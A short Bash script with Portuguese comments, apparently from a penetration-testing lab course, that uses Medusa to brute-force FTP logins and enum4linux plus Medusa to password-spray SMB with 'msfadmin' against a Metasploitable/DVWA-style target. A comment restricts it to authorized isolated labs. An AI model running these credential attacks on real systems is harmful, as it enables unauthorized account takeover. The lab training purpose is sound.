#!/usr/bin/env bash
# bruteforce.sh - Executa os 3 cenarios de brute force com Medusa
# Uso: ./bruteforce.sh 192.168.56.102
# AVISO: use SOMENTE em laboratorio autorizado e isolado.

set -uo pipefail

TARGET="${1:-}"
WL_USERS="wordlists/users.txt"
WL_PASS="wordlists/passwords.txt"

if [[ -z "$TARGET" ]]; then
  echo "Uso: $0 <IP_DO_ALVO>"
  exit 1
fi

banner() { echo; echo "=============================================="; echo " $1"; echo "=============================================="; }

banner "CENARIO 1 - Forca bruta em FTP"
medusa -h "$TARGET" -U "$WL_USERS" -P "$WL_PASS" -M ftp -t 4 -f

banner "CENARIO 3 - Password spraying em SMB"
echo "[*] Enumerando usuarios..."
enum4linux -U "$TARGET" 2>/dev/null | grep -i "user:" || true
echo "[*] Testando senha unica 'msfadmin' contra a lista de usuarios..."
medusa -h "$TARGET" -U "$WL_USERS" -p msfadmin -M smbnt -t 1

banner "DVWA (Cenario 2) e manual"
echo "Para o formulario web do DVWA, capture o PHPSESSID e rode:"
echo "  ver README.md -> Cenario 2"

echo
echo "[+] Rotina concluida."
